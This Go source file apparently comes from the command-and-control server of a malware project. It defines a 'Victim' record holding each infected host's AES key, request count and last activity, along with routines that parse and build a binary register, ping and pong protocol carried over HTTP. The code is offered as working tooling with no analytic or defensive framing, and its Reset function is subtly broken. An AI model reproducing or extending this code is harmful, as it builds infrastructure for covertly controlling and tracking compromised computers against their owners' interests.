package miller

import (
    "github.com/zhuangsirui/binpacker"

    "fmt"
    "time"
    "encoding/json"
    "encoding/binary"
    //"encoding/hex"
    "bytes"
)


type Victim struct {
    Last_rf_rx  uint8               `json:"LRFRX"`
    Last_rc_rx  uint16              `json:"LRCRX"`
    Last_rf_tx  uint8               `json:"LRFTX"`
    Last_rc_tx  uint16              `json:"LRCTX"`
    Last_active time.Time           `json:"LA"`
    Last_json   time.Time           `json:"LJ"`
    Aeskey      [AESKEY_SIZ]byte    `json:"AK"`
    Requests    uint                `json:"REQS"`
}


func NewVictim() *Victim {
    return &Victim{ 0, 0, 0, 0, time.Time{}, time.Time{}, [AESKEY_SIZ]byte{}, 0 }
}

func (v *Victim) Reset() {
    v.Last_rf_rx = 0
    v.Last_rf_rx = 0
}

func (v *Victim) String() string {
    return fmt.Sprintf("last_rf_rx: 0x%04X, last_rc_rx: 0x%04X, last_rf_tx: 0x%04X, " +
                       "last_rc_tx: 0x%04X, aeskey: '%v', requests: %v",
        v.Last_rf_rx, v.Last_rc_rx, v.Last_rf_tx, v.Last_rc_tx, v.Aeskey, v.Requests)
}

func (v *Victim) ToJSON(debug_only bool) ([]byte, error) {
    if !debug_only {
        v.Last_json = time.Now()
    }
    return json.Marshal(v)
}

func (v *Victim) FromJSON(json_input []byte) error {
    return json.Unmarshal(json_input, v)
}

func copySliceToArray(dest []byte, src []byte, siz int) error {
    if len(src) != len(dest) {
        return fmt.Errorf("parseValue: %d bytes (src) != %d bytes (dest)", len(src), len(dest))
    }
    copied := copy(dest[:], src)
    if copied != siz {
        return fmt.Errorf("parseMarker: copied only %d instead of %d", copied, siz)
    }
    return nil
}

func ParseMarker(dest *[MARKER_SIZ]byte, src []byte) error {
    return copySliceToArray(dest[:], src, int(MARKER_SIZ))
}

func ParseMarkerResponse(response *HttpResp, src []byte) error {
    return ParseMarker(&response.StartMarker, src)
}

func ParseAESKey(dest *[AESKEY_SIZ]byte, src []byte) error {
    return copySliceToArray(dest[:], src, int(AESKEY_SIZ))
}

func ParseAESKeyResponse(response *RespRegister, src []byte) error {
    return ParseAESKey(&response.Aeskey, src)
}

func (v *Victim) SetAESKey(aeskey []byte) error {
    return ParseAESKey(&v.Aeskey, aeskey)
}

func (v *Victim) HasAESKey() bool {
    var nullkey [AESKEY_SIZ]byte
    return !bytes.Equal(v.Aeskey[:], nullkey[:])
}

func (v *Victim) ParseRequest(dest []byte, response *HttpResp) error {
    buffer := bytes.NewBuffer(dest)
    unpacker := binpacker.NewUnpacker(binary.LittleEndian, buffer)
    marker_bytearr, err := unpacker.ShiftBytes(uint64(MARKER_SIZ))
    if err != nil {
        return fmt.Errorf("marker: %s", err)
    }
    if copy(response.StartMarker[:], marker_bytearr) != int(MARKER_SIZ) {
        return fmt.Errorf("marker: copy failed")
    }
    v.Last_active = time.Now()
    unpacker.FetchUint8(&response.RespFlags)
    v.Last_rf_rx = response.RespFlags
    unpacker.FetchUint16(&response.RespCode)
    v.Last_rc_rx = response.RespCode
    if !v.HasAESKey() {
        v.Last_rc_rx = RC_REGISTER
    }
    unpacker.FetchUint32(&response.Pkgsiz)
    response.Pkgbuf, err = unpacker.ShiftBytes(uint64(response.Pkgsiz))
    if err != nil {
        return fmt.Errorf("pkgbuf: %s", err)
    }
    v.Requests++
    return nil
}

func (v *Victim) buildResponse(response *HttpResp, dest []byte) ([]byte, error) {
    buffer := bytes.Buffer{}
    packer := binpacker.NewPacker(binary.LittleEndian, &buffer)
    packer.PushBytes(response.StartMarker[:])
    packer.PushUint8(response.RespFlags)
    v.Last_rf_tx = response.RespFlags
    packer.PushUint16(response.RespCode)
    v.Last_rc_tx = response.RespCode
    packer.PushUint32(response.Pkgsiz)
    packer.PushBytes(response.Pkgbuf)
    err := packer.Error()
    if err != nil {
        v.Reset()
        return nil, err
    }
    return append(dest, buffer.Bytes()...), nil
}

func (v *Victim) BuildRegisterResponse(response *HttpResp, respreg *RespRegister, dest []byte) ([]byte, error) {
    buffer := bytes.Buffer{}
    packer := binpacker.NewPacker(binary.LittleEndian, &buffer)
    packer.PushBytes(respreg.Aeskey[:])
    packer.PushUint32(respreg.NextPing)
    err := packer.Error()
    if err != nil {
        return nil, err
    }
    response.Pkgsiz = uint32(len(buffer.Bytes()))
    response.Pkgbuf = buffer.Bytes()
    return v.buildResponse(response, dest)
}

func (v *Victim) BuildPongResponse(response *HttpResp, respong *RespPong, dest []byte) ([]byte, error) {
    buffer := bytes.Buffer{}
    packer := binpacker.NewPacker(binary.LittleEndian, &buffer)
    packer.PushUint32(respong.NextPing)
    err := packer.Error()
    if err != nil {
        return nil, err
    }
    response.Pkgsiz = uint32(len(buffer.Bytes()))
    response.Pkgbuf = buffer.Bytes()
    return v.buildResponse(response, dest)
}

func (v *Victim) BuildInfoResponse(response *HttpResp, dest []byte) ([]byte, error) {
    response.Pkgsiz = 0
    response.Pkgbuf = nil
    return v.buildResponse(response, dest)
}
